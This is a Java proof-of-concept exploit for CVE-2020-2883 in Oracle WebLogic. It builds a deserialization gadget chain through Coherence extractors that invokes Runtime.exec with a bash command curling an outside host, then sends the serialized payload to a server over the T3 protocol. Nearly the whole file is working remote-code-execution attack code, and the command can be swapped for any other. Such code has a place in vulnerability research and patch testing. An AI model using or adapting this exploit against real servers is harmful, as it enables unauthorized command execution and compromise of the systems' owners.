package com.supeream;

// com.supeream from https://github.com/5up3rc/weblogic_cmd/
// com.tangosol.util.extractor.ChainedExtractor from coherence.jar

import com.supeream.serial.Reflections;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/*
 * author:Y4er.com
 *
 * readObject:797, PriorityQueue (java.util)
 * heapify:737, PriorityQueue (java.util)
 * siftDown:688, PriorityQueue (java.util)
 * siftDownUsingComparator:722, PriorityQueue (java.util)
 * compare:71, ExtractorComparator (com.tangosol.util.comparator)
 * extract:81, ChainedExtractor (com.tangosol.util.extractor)
 * extract:109, ReflectionExtractor (com.tangosol.util.extractor)
 * invoke:498, Method (java.lang.reflect)
 */

public class CVE_2020_2883 {

    public static void main(String[] args) throws Exception {
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[]{}});
        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[]{}});        //ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"calc"}});
        ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"/bin/bash", "-c", "curl http://172.16.1.1/success"}});

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                reflectionExtractor1,
                reflectionExtractor2,
                reflectionExtractor3,
        };

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = Runtime.class;
        queueArray[1] = "1";

        // serialize
        byte[] payload = Serializables.serialize(queue);

        // T3 send, you can also use python weblogic_t3.py test.ser
        T3ProtocolOperation.send("172.16.1.130", "7001", payload);

        // test
        serialize(queueArray);
//        deserialize();

    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
